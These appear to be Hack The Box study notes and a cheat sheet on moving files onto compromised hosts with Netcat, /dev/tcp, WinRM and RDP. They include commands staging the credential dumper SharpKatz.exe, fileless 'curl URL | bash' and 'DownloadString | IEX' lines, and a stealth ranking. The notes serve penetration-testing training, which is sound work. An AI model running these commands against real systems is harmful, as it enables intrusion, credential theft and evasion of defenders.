This section covers **alternative file transfer methods** beyond standard HTTP/FTP/SMB techniques. These are extremely useful when:

- Firewalls restrict common ports
    
- HTTP/HTTPS is filtered
    
- SMB is blocked
    
- Tools like curl/wget are unavailable
    
- You need quick raw transfers
    
- You already have remote admin access
    

---

# 🔹 1️⃣ Netcat & Ncat File Transfers

![Image](https://ars.els-cdn.com/content/image/3-s2.0-B9781597492577000066-gr1.jpg)

![Image](https://www.ionos.com/digitalguide/fileadmin/DigitalGuide/Screenshots_2020/netcat-5.png)

![Image](https://res.cloudinary.com/di2vaxvhl/image/upload/v1548191968/Technical_Images_netcat_Seleccion_004.png)

![Image](https://www.brainboxes.com/files/pages/support/faqs/bb-400-faqs/How-to-use-Netcat-to-pipe-serial-data-over-TCP-1.png)

## 🧠 What is Netcat?

**Netcat (nc)** is a networking utility for reading and writing data over TCP/UDP connections.

- Original Netcat → Released 1995
    
- Modern replacement → **Ncat** (from Nmap Project)
    
- Supports SSL, IPv6, proxies, etc.
    
- On HTB Pwnbox: `nc`, `netcat`, and `ncat` all work
    

---

## 📥 Method 1: Victim Listens, Attacker Sends

### 🔹 On Compromised Machine (Listener)

**Original Netcat**

```bash
nc -l -p 8000 > SharpKatz.exe
```

**Ncat**

```bash
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

> 🔥 `--recv-only` ensures connection closes when file finishes.

---

### 🔹 On Attack Host (Sender)

**Original Netcat**

```bash
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

**Ncat**

```bash
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

> 🔥 `-q 0` or `--send-only` closes connection after sending.

---

## 📥 Method 2: Attacker Listens (Firewall Safe)

If inbound traffic is blocked to victim:

### 🔹 On Attacker (Listener)

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

### 🔹 On Victim (Receiver)

```bash
nc 192.168.49.128 443 > SharpKatz.exe
```

Same logic works with **Ncat**.

---

## 📥 No Netcat? Use `/dev/tcp`

If `nc` is unavailable:

```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

> 🔥 Works if Bash ≥ 2.04 with network redirections enabled.

---

## 🧠 When to Use Netcat

|Situation|Why|
|---|---|
|HTTP blocked|Raw TCP transfer|
|Need quick binary transfer|Minimal setup|
|Internal pivot|Simple tool|
|No SMB/FTP|TCP fallback|

---

# 🔹 2️⃣ PowerShell Remoting (WinRM)

![Image](https://learn.microsoft.com/en-us/windows/win32/winrm/images/winrm-architecture.png)

![Image](https://eu-images.contentstack.com/v3/assets/blt07f68461ccd75245/blt2f9478cf51b1808a/66507db21fc9bf1af366b5cf/Remoting_204.jpg?auto=webp&disable=upscale&quality=80&width=1280)

![Image](https://user-images.githubusercontent.com/65390418/145017594-e29e7227-1ac7-4ce4-b5d8-14a3eb2a5b75.jpg)

![Image](https://www.partitionwizard.com/images/uploads/articles/2022/02/powershell-copy-file/powershell-copy-file-2.png)

## 🧠 What is PowerShell Remoting?

Uses **WinRM (Windows Remote Management)**

Default ports:

- TCP 5985 → HTTP
    
- TCP 5986 → HTTPS
    

Requires:

- Admin privileges OR
    
- Member of Remote Management Users group
    

---

## ✅ Confirm WinRM Connectivity

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

If:

```
TcpTestSucceeded : True
```

You’re good.

---

## 🔹 Create Session

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

---

## 📤 Upload File

```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

---

## 📥 Download File

```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

## 🧠 When to Use PowerShell Remoting

|Scenario|Benefit|
|---|---|
|HTTP blocked|Uses WinRM|
|Domain admin access|Clean & native|
|EDR-sensitive environment|Legit admin tool|
|Lateral movement|Clean copy method|

---

# 🔹 3️⃣ RDP File Transfers

![Image](https://learn.microsoft.com/en-us/azure/virtual-desktop/media/redirection-remote-desktop-protocol/redirection-drives.png)

![Image](https://www.net-usb.com/images/upload/UNG/articles/micr/5.jpg)

![Image](https://www.computerperformance.co.uk/images/server8/rdc_drive_tips.jpg)

![Image](https://learn-attachment.microsoft.com/api/attachments/198284-image.png?platform=QnA)

## 🧠 Basic Method: Copy & Paste

Within RDP session:

- Right-click → Copy
    
- Paste into remote desktop
    

⚠️ May fail depending on policy.

---

## 🔹 Drive Mounting (More Reliable)

### Linux → Windows

### rdesktop

```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/files'
```

### xfreerdp

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/user/files
```

---

Inside Windows:

Navigate to:

```
\\tsclient\
```

You’ll see your mounted Linux folder.

---

## 🔹 Windows Native Client

Use `mstsc.exe`

Under:

- Local Resources → Drives
    
- Select local drive to share
    

---

## ⚠ Important

> This drive is not accessible to other users logged into the target machine.

---

## 🛑 Defender Warning

> Sharing folders containing malware may cause Windows Defender to delete files on your local machine.

---

# 🔹 Quick Decision Matrix

|Restriction|Best Method|
|---|---|
|HTTP blocked|Netcat|
|SMB blocked|Netcat|
|Inbound blocked|Victim connects out|
|No nc installed|/dev/tcp|
|Admin rights available|PowerShell Remoting|
|GUI access available|RDP drive mount|

---

# 🔹 Key Takeaways

- Always know who should listen.
    
- Firewalls determine direction.
    
- Netcat = raw TCP transfer.
    
- `/dev/tcp` = fallback when nc unavailable.
    
- WinRM = clean admin-level transfer.
    
- RDP mounting = easiest GUI method.
    
- Test connectivity first.
    

---

# 🔹 Practice Makes Perfect

These techniques are extremely useful in:

- Active Directory Enumeration & Attacks
    
- Pivoting & Tunneling
    
- Enterprise Network Attacks
    
- Shell & Payload scenarios

💡 Master multiple techniques.  
💡 Don’t rely on just one method.  
💡 Environment restrictions determine your approach.

### Cheatsheet
# 📦 File Transfer Methods – Table Cheat Sheet
---

## 🔹 Universal File Transfer Quick Reference

|Method|OS|Direction|Listener Location|Default Port|Stealth Level|Requirements|Example Command|
|---|---|---|---|---|---|---|---|
|Netcat (nc)|Linux/Windows|Upload/Download|Either|Custom|Medium|nc installed|`nc -l -p 8000 > file`|
|Ncat|Linux/Windows|Upload/Download|Either|Custom|Medium|ncat installed|`ncat --send-only IP PORT < file`|
|`/dev/tcp`|Linux|Download|Attacker|Custom|Medium|Bash ≥ 2.04|`cat < /dev/tcp/IP/PORT > file`|
|PowerShell WebClient|Windows|Download|Attacker|80/443|Low|PowerShell|`(New-Object Net.WebClient).DownloadFile()`|
|PowerShell Remoting|Windows|Upload/Download|Remote Host|5985/5986|High|Admin + WinRM|`Copy-Item -ToSession`|
|SMB (Impacket)|Windows/Linux|Upload/Download|Attacker|445|Medium|SMB allowed|`copy \\IP\share\file`|
|FTP|Windows/Linux|Upload/Download|Either|21|Low|FTP allowed|`ftp -v -n -s:file.txt`|
|RDP Drive Mount|Windows|Upload/Download|N/A (GUI)|3389|High|RDP access|`/drive:local,/path`|
|SCP|Linux|Upload/Download|Either|22|High|SSH allowed|`scp file user@IP:/path`|
|wget|Linux|Download|Attacker|80/443|Low|wget installed|`wget URL -O file`|
|curl|Linux|Download|Attacker|80/443|Low|curl installed|`curl -o file URL`|
|Python one-liner|Linux/Windows|Download|Attacker|80/443|Medium|Python installed|`python3 -c 'urllib...'`|
|PHP one-liner|Linux|Download|Attacker|80/443|Medium|PHP installed|`php -r 'file_get_contents()'`|
|Ruby|Linux|Download|Attacker|80/443|Medium|Ruby installed|`ruby -e 'Net::HTTP...'`|
|Perl|Linux|Download|Attacker|80/443|Medium|Perl installed|`perl -e 'getstore()'`|
|Base64 Copy/Paste|Linux/Windows|Upload/Download|N/A|None|Very High|Terminal access|`cat file|

---

# 🔹 Netcat / Ncat Quick Commands

|Scenario|Listener|Sender|
|---|---|---|
|Victim listens|`nc -l -p 8000 > file`|`nc IP 8000 < file`|
|Attacker listens|`nc -l -p 443 -q 0 < file`|`nc IP 443 > file`|
|Ncat receive|`ncat -l -p 8000 --recv-only > file`|`ncat --send-only IP 8000 < file`|

---

# 🔹 PowerShell Quick Reference

|Action|Command|
|---|---|
|Download File|`(New-Object Net.WebClient).DownloadFile('URL','file')`|
|Fileless Execute|`(New-Object Net.WebClient).DownloadString('<URL>') \| IEX`|
|Invoke-WebRequest|`iwr URL -OutFile file`|
|WinRM Session|`$s = New-PSSession -ComputerName HOST`|
|Upload via WinRM|`Copy-Item file -ToSession $s -Destination C:\`|
|Download via WinRM|`Copy-Item file -FromSession $s -Destination C:\`|

---

# 🔹 Linux Web Download Cheat Sheet

|Tool|Command|
|---|---|
|wget|`wget URL -O file`|
|curl|`curl -o file URL`|
|Fileless wget|`wget -qO- URL \| bash`|
|Fileless curl|`curl URL \| bash`|

---

# 🔹 Base64 Transfer (No Network Required)

### Encode (Linux)

```
cat file | base64 -w 0
```

### Decode (Linux)

```
echo BASE64STRING | base64 -d > file
```

### Decode (PowerShell)

```powershell
[IO.File]::WriteAllBytes("file",[Convert]::FromBase64String("STRING"))
```

---

# 🔹 When to Use What

|Environment Restriction|Best Method|
|---|---|
|Only HTTP/HTTPS allowed|curl / wget / PowerShell|
|No HTTP but raw TCP allowed|Netcat|
|No nc installed|`/dev/tcp`|
|Admin on Windows|PowerShell Remoting|
|SSH allowed|SCP|
|GUI access available|RDP mount|
|Everything blocked|Base64 copy/paste|

---

# 🔹 Stealth Ranking (From Most to Least Stealthy)

1. Base64 copy/paste
    
2. PowerShell Remoting
    
3. SCP (SSH encrypted)
    
4. RDP drive mount
    
5. Netcat raw TCP
    
6. HTTP downloads
    
7. FTP (least stealthy)
---

